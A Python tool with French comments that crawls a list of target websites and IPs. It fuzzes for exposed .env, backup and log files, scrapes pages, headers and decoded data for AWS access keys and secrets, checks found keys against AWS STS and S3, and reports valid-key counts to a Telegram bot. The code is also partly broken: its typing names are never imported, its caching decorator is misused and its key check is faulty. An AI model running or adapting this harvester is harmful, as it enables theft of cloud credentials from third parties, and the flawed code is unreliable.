import re
import asyncio
import aiohttp
import sys
import json
import logging
import boto3
import argparse
import time
import random
import os
from urllib.parse import urlparse, urljoin, unquote
from bs4 import BeautifulSoup, Comment
from requests_html import AsyncHTMLSession
import socket
import telebot
from functools import lru_cache
import base64
import json as json_parser
import urllib.parse
import yaml

# Configuration du logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Expressions régulières avancées
AKIA_PATTERN = r'\b(AKIA[A-Z0-9]{16})\b(?![^\n]*\b(example|test|sample|dummy)\b|\s*(?:#|//|<!--)[\s\S]*\b\1\b)'
SECRET_PATTERN = r'\b[a-zA-Z0-9+/]{40}\b(?![^\n]*\b(example|test|sample|dummy)\b|\s*(?:#|//|<!--)[\s\S]*\b\1\b)'
AWS_ENV_PATTERN = r'(?:AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|aws_access_key_id|aws_secret_access_key)\s*[:=]\s*[\'"]?([a-zA-Z0-9+/]{16,40})[\'"]?'

# Telegram setup
TELEGRAM_TOKEN = "VOTRE_TOKEN_TELEGRAM"
TELEGRAM_CHAT_ID = "VOTRE_CHAT_ID"
bot = telebot.TeleBot(TELEGRAM_TOKEN) if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID else None

def interactive_file_selection():
    """Menu interactif pour sélectionner un fichier."""
    print("\n=== Sélection du fichier d'entrée ===")
    files = [f for f in os.listdir('.') if f.endswith('.txt')]
    if not files:
        print("Aucun fichier .txt trouvé dans le répertoire courant.")
        sys.exit(1)

    print("Fichiers disponibles :")
    for idx, file in enumerate(files, 1):
        print(f"{idx}. {file}")
    
    while True:
        choice = input("\nEntrez le nom du fichier (ex. targets.txt) ou 'q' pour quitter : ").strip()
        if choice.lower() == 'q':
            sys.exit(0)
        if choice in files:
            return choice
        print("Fichier non trouvé. Veuillez réessayer.")

def read_targets_from_file(file_path):
    """Lit les URLs et IPs depuis un fichier."""
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        logger.error(f"Fichier {file_path} non trouvé.")
        sys.exit(1)

# Session async avec cache
@lru_cache(maxsize=3000)
async def fetch_content(session: aiohttp.ClientSession, url: str, timeout: int = 45) -> dict:
    """Récupère le contenu avec gestion des erreurs et métadonnées."""
    headers = {
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.0.0 Safari/537.36"
    }
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout), allow_redirects=True, headers=headers) as response:
            text = await response.text()
            headers = str(response.headers)
            cookies = str(response.cookies)
            status = response.status
            if status >= 400:
                text += f" [Erreur {status}: {await response.text()}]"
            await asyncio.sleep(random.uniform(0.5, 2.0))
            return {"content": text, "headers": headers, "cookies": cookies}
    except Exception as e:
        logger.warning(f"Échec pour {url}: {e}")
        return {"content": "", "headers": "", "cookies": ""}

async def explore_hidden_resources(asession: AsyncHTMLSession, base_url: str, timeout: int) -> List[str]:
    """Explore des ressources cachées via fuzzing léger."""
    hidden_resources = set()
    # Inspiré de Laravel et des fuites courantes
    fuzz_list = [
        "/.env", "/.env.example", "/.env.backup", "/config/app.php", "/config/aws.php",
        "/api/v1/keys", "/api/v2/config", "/wp-json", "/debug.log", "/error.log",
        "/backup.sql", "/dump.sql", "/config.bak", "/config-backup.json", "/keys.txt"
    ]
    for fuzz in fuzz_list:
        test_url = urljoin(base_url, fuzz)
        if test_url not in hidden_resources:
            hidden_resources.add(test_url)

    domain = urlparse(base_url).netloc.replace("www.", "")
    hidden_resources.update([
        f"http://{domain}/api", f"https://{domain}/config",
        f"http://dev.{domain}", f"https://staging.{domain}"
    ])
    return list(hidden_resources)

async def capture_dynamic_content(asession: AsyncHTMLSession, url: str, timeout: int = 45) -> str:
    """Capture le contenu dynamique et suit les appels API."""
    try:
        session = AsyncHTMLSession()
        r = await session.get(url)
        await r.html.arender(timeout=timeout, sleep=2)
        content = r.html.html
        network_calls = [link for link in r.html.absolute_links if any(kw in link.lower() for kw in ['api', 'data', 'key', 'config'])]
        tasks = [fetch_content(asession, call, timeout) for call in network_calls[:5]]
        network_contents = await asyncio.gather(*tasks)
        network_data = " ".join(c["content"] for c in network_contents if c["content"])
        return content + " " + network_data
    except Exception as e:
        logger.warning(f"Erreur de rendu dynamique pour {url}: {e}")
        return ""

async def extract_from_comments(content: str) -> str:
    """Extrait les commentaires HTML/JavaScript pour analyse."""
    soup = BeautifulSoup(content, 'html.parser')
    comments = soup.find_all(string=lambda text: isinstance(text, Comment))
    return " ".join(comment for comment in comments)

async def explore_target(asession: AsyncHTMLSession, target: str, timeout: int = 45) -> List[str]:
    """Explore le target avec une logique avancée."""
    base_url = target if target.startswith(('http://', 'https://')) else f"http://{target}"
    discovered = {base_url}
    to_explore = [base_url]
    sensitive_endpoints = {
        '/config', '/.env', '/secrets', '/api', '/backup', '/login', '/admin',
        '/config.json', '/credentials', '/api/keys', '/config/aws.php'
    }
    found_sensitive = False

    while to_explore and len(discovered) < 75:
        current = to_explore.pop()
        try:
            content_dict = await fetch_content(asession, current, timeout)
            content = content_dict["content"]
            soup = BeautifulSoup(content, 'html.parser')

            # Vérifier la pertinence
            if any(kw in content.lower() for kw in {'key', 'secret', 'password', 'aws'}):
                found_sensitive = True
            elif not found_sensitive and len(discovered) > 15:
                logger.info(f"Arrêt de l'exploration de {current} faute de données sensibles.")
                break

            # Extraire liens et scripts
            for link in soup.find_all(['a', 'script', 'link'], href=True):
                abs_url = urljoin(current, link.get('href'))
                if abs_url.startswith(('http://', 'https://')) and abs_url not in discovered:
                    discovered.add(abs_url)
                    to_explore.append(abs_url)

            # Ajouter endpoints prioritaires
            for endpoint in sensitive_endpoints:
                test_url = urljoin(current, endpoint)
                if test_url not in discovered:
                    discovered.add(test_url)
                    to_explore.append(test_url)

            # Explorer ressources cachées
            hidden = await explore_hidden_resources(asession, current, timeout)
            discovered.update(hidden)
            to_explore.extend(hidden)

            # Analyser commentaires
            comments = await extract_from_comments(content)
            if any(kw in comments.lower() for kw in {'key', 'secret', 'aws'}):
                discovered.add(f"{current}/comments")

            await asyncio.sleep(random.uniform(0.5, 2.0))

        except Exception as e:
            logger.warning(f"Erreur d'exploration {current}: {e}")
    return list(discovered)

async def scan_port(ip: str, port: int) -> str:
    """Scanne un port pour les bannières."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    result = sock.connect_ex((ip, port))
    if result == 0:
        try:
            sock.send(b"HEAD / HTTP/1.1\r\nHost: dummy\r\n\r\n")
            banner = sock.recv(1024).decode(errors='ignore')
            return banner
        except Exception:
            return ""
    return ""

def analyze_semantic_context(content: str, match: str) -> float:
    """Analyse le contexte sémantique pour attribuer un score."""
    context = content[max(0, content.index(match) - 100):content.index(match) + 100].lower()
    positive_keywords = {'aws', 'access', 'key', 'secret', 'credential', 'id', 'config', 'token'}
    negative_keywords = {'example', 'test', 'sample', 'dummy', 'mock', 'demo'}
    score = sum(1 for kw in positive_keywords if kw in context) / len(positive_keywords)
    score -= sum(1 for kw in negative_keywords if kw in context) / len(negative_keywords)
    return max(0.0, min(1.0, score))

def detect_aws_patterns(content: str) -> List[Tuple[str, float]]:
    """Détecte les clés AWS en utilisant des motifs spécifiques."""
    aws_keys = []
    matches = re.findall(AWS_ENV_PATTERN, content, re.IGNORECASE)
    for match in matches:
        if len(match) == 16 and match.startswith("AKIA"):
            aws_keys.append((match, 0.95))  # Score élevé pour les motifs Laravel
        elif len(match) == 40:
            aws_keys.append((match, 0.95))
    return aws_keys

async def extract_keys_from_content(content: str) -> Tuple[List[Tuple[str, float]], List[Tuple[str, float]]]:
    """Extrait les clés avec analyse avancée."""
    akia_keys = [(k, analyze_semantic_context(content, k)) for k in re.findall(AKIA_PATTERN, content)]
    secret_keys = [(s, analyze_semantic_context(content, s)) for s in re.findall(SECRET_PATTERN, content)]

    # Détection via motifs AWS (inspiré de Laravel)
    aws_pattern_keys = detect_aws_patterns(content)
    for key, score in aws_pattern_keys:
        if len(key) == 16 and key.startswith("AKIA"):
            akia_keys.append((key, score))
        elif len(key) == 40:
            secret_keys.append((key, score))

    # Détection dans données encodées
    try:
        # Base64
        decoded_b64 = base64.b64decode(content).decode(errors='ignore')
        akia_keys.extend([(k, analyze_semantic_context(decoded_b64, k)) for k in re.findall(AKIA_PATTERN, decoded_b64) if k not in [k[0] for k in akia_keys]])
        secret_keys.extend([(s, analyze_semantic_context(decoded_b64, s)) for s in re.findall(SECRET_PATTERN, decoded_b64) if s not in [s[0] for s in secret_keys]])
        aws_pattern_keys = detect_aws_patterns(decoded_b64)
        for key, score in aws_pattern_keys:
            if len(key) == 16 and key.startswith("AKIA"):
                akia_keys.append((key, score))
            elif len(key) == 40:
                secret_keys.append((key, score))

        # URL encoding
        decoded_url = unquote(content)
        akia_keys.extend([(k, analyze_semantic_context(decoded_url, k)) for k in re.findall(AKIA_PATTERN, decoded_url) if k not in [k[0] for k in akia_keys]])
        secret_keys.extend([(s, analyze_semantic_context(decoded_url, s)) for s in re.findall(SECRET_PATTERN, decoded_url) if s not in [s[0] for s in secret_keys]])

        # JSON, YAML
        try:
            json_data = json_parser.loads(content)
            json_str = json.dumps(json_data)
            akia_keys.extend([(k, analyze_semantic_context(json_str, k)) for k in re.findall(AKIA_PATTERN, json_str) if k not in [k[0] for k in akia_keys]])
            secret_keys.extend([(s, analyze_semantic_context(json_str, s)) for s in re.findall(SECRET_PATTERN, json_str) if s not in [s[0] for s in secret_keys]])
        except json_parser.JSONDecodeError:
            pass
        try:
            yaml_data = yaml.safe_load(content)
            yaml_str = str(yaml_data)
            akia_keys.extend([(k, analyze_semantic_context(yaml_str, k)) for k in re.findall(AKIA_PATTERN, yaml_str) if k not in [k[0] for k in akia_keys]])
            secret_keys.extend([(s, analyze_semantic_context(yaml_str, s)) for s in re.findall(SECRET_PATTERN, yaml_str) if s not in [s[0] for s in secret_keys]])
        except yaml.YAMLError:
            pass

    except Exception as e:
        logger.warning(f"Erreur de décodage pour {content[:50]}...: {e}")

    return akia_keys, secret_keys

async def scan_target(asession: AsyncHTMLSession, target: str, timeout: int = 45) -> Dict:
    """Scanne un target avec recherche optimisée."""
    results = {'aws_akia_keys': [], 'aws_secret_keys': []}
    try:
        if target.startswith(('http://', 'https://')):
            # Exploration statique
            urls = await explore_target(asession, target, timeout)
            tasks = [fetch_content(asession, url, timeout) for url in urls]
            contents = await asyncio.gather(*tasks)
            content = " ".join(c["content"] + " " + c["headers"] + " " + c["cookies"] for c in contents if c["content"])

            # Contenu dynamique
            dynamic_content = await capture_dynamic_content(asession, target, timeout)
            content += " " + dynamic_content

            # Extraction des clés
            akia_keys, secret_keys = await extract_keys_from_content(content)
            for key, score in akia_keys:
                if score >= 0.6:
                    is_valid, account = validate_akia_key(key)
                    results['aws_akia_keys'].append((key, is_valid, account, f"Confiance: {score:.2f}"))
            for secret, score in secret_keys:
                if score >= 0.6:
                    results['aws_secret_keys'].append((secret, f"Confiance: {score:.2f}"))

        elif is_valid_ip(target):
            ports = [80, 443]
            tasks = [scan_port(target, port) for port in ports]
            banners = await asyncio.gather(*tasks)
            content = " ".join(b for b in banners if b)

            akia_keys, secret_keys = await extract_keys_from_content(content)
            for key, score in akia_keys:
                if score >= 0.6:
                    is_valid, account = validate_akia_key(key)
                    results['aws_akia_keys'].append((key, is_valid, account, f"Confiance: {score:.2f}"))
            for secret, score in secret_keys:
                if score >= 0.6:
                    results['aws_secret_keys'].append((secret, f"Confiance: {score:.2f}"))

    except Exception as e:
        logger.error(f"Erreur de scan pour {target}: {e}")
    return results

def is_valid_ip(ip: str) -> bool:
    """Vérifie si une IP est valide."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def validate_akia_key(access_key_id: str, aws_profile: str = 'default') -> Tuple[bool, str]:
    """Valide une clé AWS avec test API."""
    try:
        sts = boto3.Session(profile_name=aws_profile).client('sts')
        response = sts.get_access_key_info(AccessKeyId=access_key_id)
        s3 = boto3.client('s3', aws_access_key_id=access_key_id, aws_secret_access_key='dummy')
        s3.list_buckets()
        return True, response['Account']
    except Exception as e:
        return False, str(e)

def send_telegram_message(message: str):
    """Envoie un message Telegram avec recommandations."""
    if bot:
        try:
            msg = f"{message}\nRecommandations : Désactiver les clés AWS via IAM ou contacter le support AWS."
            bot.send_message(TELEGRAM_CHAT_ID, msg[:4096])
            logger.info("Message Telegram envoyé.")
        except Exception as e:
            logger.error(f"Erreur Telegram : {e}")

def write_results_to_files(results: Dict, text_output: str, json_output: str):
    """Écrit les résultats avec détails."""
    with open(text_output, 'w') as file:
        for target, data in results.items():
            file.write(f"Target : {target} @ {time.strftime('%H:%M:%S %Z on %A, %B %d, %Y')}\n")
            file.write(f"Clés AWS AKIA : {[(k, v, a, c) for k, v, a, c in data['aws_akia_keys']]}\n")
            file.write(f"Clés AWS Secrètes : {data['aws_secret_keys']}\n")
            file.write(f"Actions : {'Désactiver les clés AWS via IAM' if any(v for _, v, _, _ in data['aws_akia_keys']) else 'Aucune action requise'}\n")
            file.write("-" * 50 + "\n")

    with open(json_output, 'w') as file:
        json.dump(results, file, indent=2)

    telegram_msg = f"Scan @ {time.strftime('%H:%M:%S %Z on %A, %B %d, %Y')} ({len(results)} targets) :\n" + "\n".join(
        f"{t} : AWS={len([k for k, v, _, _ in d['aws_akia_keys'] if v])}" for t, d in results.items()
    )
    send_telegram_message(telegram_msg)

async def main(args):
    """Fonction principale pour le scan optimisé."""
    logger.info(f"Démarrage du scan optimisé @ {time.strftime('%H:%M:%S %Z on %A, %B %d, %Y')}...")
    targets = read_targets_from_file(args.input_file)
    if not targets:
        logger.warning("Aucun target valide.")
        return

    try:
        boto3.Session(profile_name=args.aws_profile)
    except Exception as e:
        logger.error(f"Erreur de profil AWS : {e}")
        sys.exit(1)

    async with AsyncHTMLSession() as asession:
        results = {}
        tasks = [scan_target(asession, target, args.timeout) for target in targets]
        for future in asyncio.as_completed(tasks):
            target = targets[tasks.index(future)]
            try:
                results[target] = await future
                logger.info(f"Scan terminé pour {target}")
                print(f"\nTarget : {target}")
                print(f"Clés AWS AKIA : {[(k, v, a, c) for k, v, a, c in results[target]['aws_akia_keys']]}")
                print(f"Clés AWS Secrètes : {results[target]['aws_secret_keys']}")
            except Exception as e:
                logger.error(f"Erreur sur {target} : {e}")
                results[target] = {'aws_akia_keys': [], 'aws_secret_keys': []}

    write_results_to_files(results, args.text_output, args.json_output)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Scan optimisé des fuites AWS avec menu interactif.")
    parser.add_argument('--text-output', default='results.txt', help="Fichier texte")
    parser.add_argument('--json-output', default='results.json', help="Fichier JSON")
    parser.add_argument('--timeout', type=int, default=45, help="Délai d'attente en secondes")
    parser.add_argument('--aws-profile', default='default', help="Profil AWS")
    parser.add_argument('--temp-dir', default='temp_scan', help="Répertoire temporaire")
    
    # Sélection interactive du fichier
    input_file = interactive_file_selection()
    args = parser.parse_args()
    args.input_file = input_file  # Ajout du fichier sélectionné aux arguments
    
    asyncio.run(main(args))